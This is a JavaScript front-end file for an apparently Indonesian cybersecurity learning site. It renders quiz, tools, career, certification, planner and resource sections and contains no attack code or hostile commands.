================================================================ */
let QS = { catIdx: -1, qIdx: 0, score: 0 };

function buildQuiz() {
  const c = document.getElementById('quizContainer');
  if (!c) return;
  c.innerHTML = '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px;margin-bottom:24px" id="quizCats"></div><div id="quizArea"></div>';
  QUIZ_DATA.forEach((cat, i) => {
    const card = document.createElement('div');
    card.className = 'glass-card';
    card.style.cssText = 'cursor:pointer;text-align:center;padding:20px';
    card.innerHTML = `<i class="fas ${cat.icon}" style="font-size:26px;color:${cat.color};margin-bottom:10px;display:block"></i><div style="font-size:13px;font-weight:700">${esc(cat.category)}</div><div style="font-size:11px;color:var(--muted);margin-top:4px">${cat.questions.length} pertanyaan</div>`;
    card.addEventListener('click', () => startQuiz(i));
    document.getElementById('quizCats').appendChild(card);
  });
}

function startQuiz(idx) {
  QS = { catIdx: idx, qIdx: 0, score: 0 };
  renderQ();
}

function renderQ() {
  const cat = QUIZ_DATA[QS.catIdx];
  const q = cat.questions[QS.qIdx];
  const area = document.getElementById('quizArea');
  if (!area) return;
  area.innerHTML = '';

  const card = document.createElement('div');
  card.className = 'glass-card';
  card.style.maxWidth = '640px';

  card.innerHTML = `
    <div style="display:flex;justify-content:space-between;margin-bottom:14px">
      <span style="font-size:11px;color:var(--muted);letter-spacing:2px">${esc(cat.category)}</span>
      <span style="font-size:11px;color:var(--primary)">${QS.qIdx + 1} / ${cat.questions.length}</span>
    </div>
    <div class="progress-wrap" style="margin-bottom:18px">
      <div class="progress-fill pg-teal" style="width:${(QS.qIdx / cat.questions.length) * 100}%"></div>
    </div>
    <div style="font-size:14px;font-weight:700;margin-bottom:18px;line-height:1.5">${esc(q.q)}</div>
  `;

  const optsDiv = document.createElement('div');
  q.opts.forEach((opt, i) => {
    const btn = document.createElement('div');
    btn.className = 'quiz-opt';
    btn.textContent = opt;
    btn.addEventListener('click', () => answerQ(i, q, optsDiv, fbDiv));
    optsDiv.appendChild(btn);
  });
  card.appendChild(optsDiv);

  const fbDiv = document.createElement('div');
  fbDiv.style.marginTop = '14px';
  card.appendChild(fbDiv);
  area.appendChild(card);
}

function answerQ(sel, q, optsDiv, fbDiv) {
  optsDiv.querySelectorAll('.quiz-opt').forEach(o => { o.style.pointerEvents = 'none'; o.style.cursor = 'default'; });
  optsDiv.querySelectorAll('.quiz-opt')[q.correct].classList.add('correct');
  if (sel !== q.correct) optsDiv.querySelectorAll('.quiz-opt')[sel].classList.add('wrong');
  else QS.score++;

  const ok = sel === q.correct;
  const isLast = QS.qIdx >= QUIZ_DATA[QS.catIdx].questions.length - 1;

  const fb = document.createElement('div');
  fb.className = `box ${ok ? 'box-success' : 'box-danger'}`;
  fb.innerHTML = `<i class="fas ${ok ? 'fa-circle-check' : 'fa-circle-xmark'} box-icon" style="color:${ok ? 'var(--success)' : 'var(--danger)'}"></i><div><strong style="color:${ok ? 'var(--success)' : 'var(--danger)'}">${ok ? 'Benar!' : 'Salah.'}</strong><br><span style="font-size:12px;color:var(--muted)">${esc(q.explain)}</span></div>`;
  fbDiv.appendChild(fb);

  const nextBtn = document.createElement('button');
  nextBtn.className = 'cyber-btn btn-primary';
  nextBtn.style.cssText = 'margin-top:12px;padding:8px 20px;font-size:11px';
  nextBtn.textContent = isLast ? 'Lihat Hasil' : 'Pertanyaan Berikutnya →';
  nextBtn.addEventListener('click', () => { isLast ? showResult() : (QS.qIdx++, renderQ()); });
  fbDiv.appendChild(nextBtn);
}

async function showResult() {
    console.log("SHOW RESULT CALLED", QS);

    const cat = QUIZ_DATA[QS.catIdx];
    const pct = Math.round((QS.score / cat.questions.length) * 100);

    try {
        console.log("Saving quiz...", {
            category: cat.category,
            score: QS.score,
            total: cat.questions.length
        });

        const res = await VeloraSec.API.Quiz.saveResult(
            cat.category,
            QS.score,
            cat.questions.length
        );

        console.log("SAVE RESPONSE:", res);

        await buildDashboard();

        console.log("Dashboard refreshed");
    } catch(err) {
        console.error("SAVE FAILED:", err);
    }

  const area = document.getElementById('quizArea');
  if (!area) return;
  const msg = pct >= 80 ? '🎉 Luar biasa! Pemahaman yang kuat.' : pct >= 60 ? '👍 Bagus! Tinjau topik yang terlewat.' : '📚 Terus belajar! Kunjungi kembali modulnya.';
  area.innerHTML = `
    <div class="glass-card" style="max-width:460px;text-align:center">
      <div style="font-size:44px;font-weight:900;color:var(--primary);margin-bottom:6px">${pct}%</div>
      <div style="font-size:16px;font-weight:700;margin-bottom:8px">${QS.score} / ${cat.questions.length} Benar</div>
      <div style="font-size:13px;color:var(--muted);margin-bottom:22px">${msg}</div>
      <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">
        <button class="cyber-btn btn-primary" style="padding:8px 18px;font-size:11px" onclick="startQuiz(${QS.catIdx})">
          <i class="fas fa-rotate-right"></i> Coba Lagi
        </button>
        <button class="cyber-btn btn-outline" style="padding:8px 18px;font-size:11px;border:1px solid" onclick="buildQuiz()">
          <i class="fas fa-list"></i> Pilih Kategori
        </button>
      </div>
    </div>
  `;
}

/* ================================================================
   TOOLS
================================================================ */
function buildTools() {
  const c = document.getElementById('toolsContainer');
  if (!c) return;
  c.innerHTML = Object.entries(TOOLS).map(([cat, tools]) => `
    <div style="margin-bottom:30px">
      <div class="sec-div"><div class="bar"></div><div style="font-size:12px;color:var(--primary);font-weight:700;letter-spacing:3px">${cat.toUpperCase()}</div></div>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:14px">
        ${tools.map(t => `
          <div class="glass-card">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px">
              <div style="font-size:14px;font-weight:900">${esc(t.name)}</div>
              ${diffDots(t.diff)}
            </div>
            <div style="font-size:11px;color:var(--primary);margin-bottom:8px">${esc(t.func)}</div>
            <div style="font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.7">
              <strong style="color:var(--text)">Use:</strong> ${esc(t.use)}<br>
              <strong style="color:var(--success)">✓</strong> ${esc(t.pros)}<br>
              <strong style="color:var(--danger)">✗</strong> ${esc(t.cons)}
            </div>
            <a href="${t.url}" target="_blank" rel="noopener noreferrer"
               style="display:inline-flex;align-items:center;gap:6px;font-size:11px;color:var(--secondary);text-decoration:none;padding:4px 10px;border:1px solid rgba(0,191,255,0.3);border-radius:4px;transition:background 0.2s">
              <i class="fas fa-external-link"></i> Official Site
            </a>
            <a href="${t.url1}" rel="noopener noreferrer"
               style="display:inline-flex;align-items:center;gap:6px;font-size:11px;color:var(--danger);text-decoration:none;padding:4px 10px;border:1px solid rgba(245, 6, 6, 0.3);border-radius:4px;transition:background 0.2s">
              <i class="fas fa-external-link"></i> Guide
            </a>
          </div>
        `).join('')}
      </div>
    </div>
  `).join('');
}

/* ================================================================
   CAREER
================================================================ */
function buildCareer() {
  const c = document.getElementById('careerContainer');
  if (!c) return;
  c.innerHTML = `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:18px">
    ${CAREERS.map(r => `
      <div class="career-card">
        <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
          <div style="width:40px;height:40px;border-radius:10px;background:${r.color}18;color:${r.color};display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0"><i class="${r.icon}"></i></div>
          <div>
            <div style="font-size:14px;font-weight:900">${esc(r.title)}</div>
            <span class="badge b-blue">${esc(r.level)}</span>
          </div>
        </div>
        <div style="font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:7px">REQUIRED SKILLS</div>
        <div style="display:flex;flex-wrap:wrap;gap:3px;margin-bottom:13px">${r.skills.map(s => `<span class="tag">${esc(s)}</span>`).join('')}</div>
        <div style="font-size:12px;margin-bottom:7px"><i class="fas fa-clock" style="color:var(--muted);margin-right:5px"></i><span style="color:var(--muted)">${esc(r.duration)}</span></div>
        <div style="font-size:12px;margin-bottom:12px"><i class="fas fa-certificate" style="color:${r.color};margin-right:5px"></i><span>${r.certs.map(esc).join(' · ')}</span></div>
        <div style="font-size:12px;color:var(--muted);line-height:1.7;border-top:1px solid var(--glass-border);padding-top:12px">
          <strong style="color:var(--text)">Daily:</strong> ${esc(r.daily)}
        </div>
      </div>
    `).join('')}
  </div>`;
}

/* ================================================================
   CERTIFICATIONS
================================================================ */
function buildCerts() {
  const c = document.getElementById('certsContainer');
  if (!c) return;
  const cols = { Beginner: 'var(--success)', Intermediate: 'var(--warn)', Advanced: 'var(--danger)' };
  c.innerHTML = Object.entries(CERTS).map(([tier, certs]) => `
    <div style="margin-bottom:30px">
      <div class="sec-div" style="margin-bottom:16px">
        <div class="bar" style="background:${cols[tier]}"></div>
        <div style="font-size:12px;font-weight:900;color:${cols[tier]};letter-spacing:2px">${tier.toUpperCase()}</div>
      </div>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:14px">
        ${certs.map(ct => `
          <div class="glass-card">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px">
              <div style="font-size:13px;font-weight:900;line-height:1.3;max-width:68%">${esc(ct.name)}</div>
              ${diffDots(ct.diff)}
            </div>
            <div style="font-size:11px;color:var(--muted);margin-bottom:7px">${esc(ct.org)}</div>
            <div style="font-size:12px;margin-bottom:12px;line-height:1.7">${esc(ct.desc)}</div>
            <div style="display:flex;gap:16px;font-size:11px;color:var(--muted)">
              <span><i class="fas fa-clock" style="margin-right:4px"></i>${esc(ct.time)}</span>
              <span><i class="fas fa-tag" style="margin-right:4px"></i>${esc(ct.cost)}</span>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `).join('');
}

/* ================================================================
   MINDSET
================================================================ */
function buildMindset() {
  const c = document.getElementById('mindsetContainer');
  if (!c) return;
  const bmap = { warn: 'box-warn', danger: 'box-danger', info: 'box-info', success: 'box-success' };
  const cmap = { warn: 'var(--warn)', danger: 'var(--danger)', info: 'var(--secondary)', success: 'var(--success)' };
  c.innerHTML = `<div style="display:flex;flex-direction:column;gap:12px">
    ${MINDSET.map(m => `
      <div class="box ${bmap[m.type]}">
        <i class="fas ${m.icon} box-icon" style="color:${cmap[m.type]}"></i>
        <div>
          <div style="font-size:13px;font-weight:700;color:${cmap[m.type]};margin-bottom:5px">${esc(m.title)}</div>
          <div style="color:var(--muted);line-height:1.8;font-size:13px">${esc(m.body)}</div>
        </div>
      </div>
    `).join('')}
  </div>`;
}

/* ================================================================
   PLANNER
================================================================ */
async function buildPlanner() {
  try {
    const saved = await VeloraSec.API.Planner.getAll();
    const map = {};
    if (saved && saved.tasks) saved.tasks.forEach(t => map[t.task_key] = t.is_done);
    
    const c = document.getElementById('plannerContainer');
    if (!c) return;
    const total = PLANNER.reduce((s, w) => s + w.days.length, 0);
    const done = Object.values(map).filter(Boolean).length;
    const pct = Math.round((done / total) * 100);

    let html = `
      <div class="glass-card" style="margin-bottom:20px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
          <div style="font-size:12px;font-weight:700;color:var(--primary);letter-spacing:2px">30-DAY COMPLETION</div>
          <div style="font-size:20px;font-weight:900;color:var(--primary)" id="plannerPct">${pct}%</div>
        </div>
        <div class="progress-wrap" style="height:9px">
          <div class="progress-fill pg-teal" id="plannerBar" style="width:${pct}%"></div>
        </div>
        <div style="font-size:11px;color:var(--muted);margin-top:7px" id="plannerCount">${done} dari ${total} tugas selesai</div>
      </div>
    `;

    PLANNER.forEach((wk, wi) => {
      html += `<div class="glass-card" style="margin-bottom:14px">
        <div style="font-size:12px;font-weight:700;color:var(--secondary);margin-bottom:3px;letter-spacing:2px">WEEK ${wk.week}</div>
        <div style="font-size:12px;color:var(--muted);margin-bottom:14px">${esc(wk.theme)}</div>`;
      wk.days.forEach((day, di) => {
        const key = `w${wi}d${di}`;
        const isDone = !!map[key];
        html += `<div class="check-item${isDone ? ' done' : ''}" id="ci-${key}" onclick="toggleTask('${key}')">
          <div class="ci-box">${isDone ? '<i class="fas fa-check" style="font-size:10px;color:#000"></i>' : ''}</div>
          <div class="ci-text">Hari ${di + 1}: ${esc(day)}</div>
        </div>`;
      });
      html += `</div>`;
    });

    html += `<div style="text-align:center;margin-top:10px">
      <button class="cyber-btn btn-outline" style="padding:8px 20px;border:1px solid;font-size:11px" onclick="resetPlanner()">
        <i class="fas fa-rotate-left"></i> Reset Progress
      </button>
    </div>`;
    c.innerHTML = html;
  } catch(e) { console.error(e); }
}

async function toggleTask(key) {
  try {
    await VeloraSec.API.Planner.updateTask(key);
    await buildPlanner();
    await buildDashboard();
  } catch (e) { console.error(e); }
}

async function resetPlanner() {
  if (!confirm('Reset semua progress planner?')) return;
  try {
    await VeloraSec.API.Planner.resetAll();
    await buildPlanner();
    await buildDashboard();
  } catch (e) { console.error(e); }
}

/* ================================================================
   RESOURCES
================================================================ */
function buildResources() {
  const c = document.getElementById('resourcesContainer');
  if (!c) return;
  c.innerHTML = Object.entries(RESOURCES).map(([cat, items]) => `
    <div style="margin-bottom:28px">
      <div class="sec-div" style="margin-bottom:12px">
        <div class="bar"></div>
        <div style="font-size:12px;color:var(--primary);font-weight:700;letter-spacing:3px">${cat.toUpperCase()}</div>
      </div>
      ${items.map(r => `
        <a class="res-link" href="${r.url != '#' ? r.url : 'javascript:void(0)'}"
           ${r.url != '#' ? 'target="_blank" rel="noopener noreferrer"' : ''}>
          <i class="fas ${r.icon}" style="color:var(--secondary);width:16px;text-align:center;flex-shrink:0"></i>
          <div style="flex:1;min-width:0">
            <div style="font-weight:700;font-size:13px">${esc(r.name)}</div>
            <div style="font-size:11px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${esc(r.desc)}</div>
          </div>
          ${r.badge ? `<span class="badge b-teal" style="flex-shrink:0">${esc(r.badge)}</span>` : ''}
          <i class="fas fa-arrow-right" style="font-size:11px;color:var(--muted);flex-shrink:0"></i>
        </a>
      `).join('')}
    </div>
  `).join('');
}

/* ================================================================
   GLOBAL SEARCH
================================================================ */
let searchTimer = null;
function globalSearchFn(q) {
  clearTimeout(searchTimer);
  searchTimer = setTimeout(async () => {
    const query = q.trim().toLowerCase();
    if (!query || query.length < 2) return;
    const results = MODULES.filter(m =>
      m.title.toLowerCase().includes(query) ||
      m.summary.toLowerCase().includes(query) ||
      m.sections.some(s => s.title.toLowerCase().includes(query) || s.body.toLowerCase().includes(query))
    );
    showSection('modules');
    await renderModules(results);
    document.querySelectorAll('.ftab').forEach(b => b.classList.remove('active'));
    const all = document.querySelector('.ftab');
    if (all) all.classList.add('active');
  }, 260);
}

/* ================================================================
   INIT
================================================================ */
document.addEventListener('DOMContentLoaded', () => {
  buildParticles();
  const isLoggedIn = typeof VeloraSec !== 'undefined' && VeloraSec.Token && VeloraSec.Token.isLoggedIn();

  if (!isLoggedIn) {
    history.replaceState({ section: 'hero' }, '', '#hero');
    _renderSection('hero');
    startTyping();
    return;
  }

  const initSection = _hashToSection();

  if (initSection === 'hero') {
    startTyping();
    sectionInited['hero'] = true;
    history.replaceState({ section: 'hero' }, '', '#hero');
    document.querySelectorAll('.nav-item[data-section]').forEach(n => {
      n.classList.toggle('active', n.dataset.section === 'hero');
    });
  } else {
    const heroEl = document.getElementById('sec-hero');
    if (heroEl) heroEl.style.display = 'none';
    _renderSection(initSection || 'dashboard');
  }
});
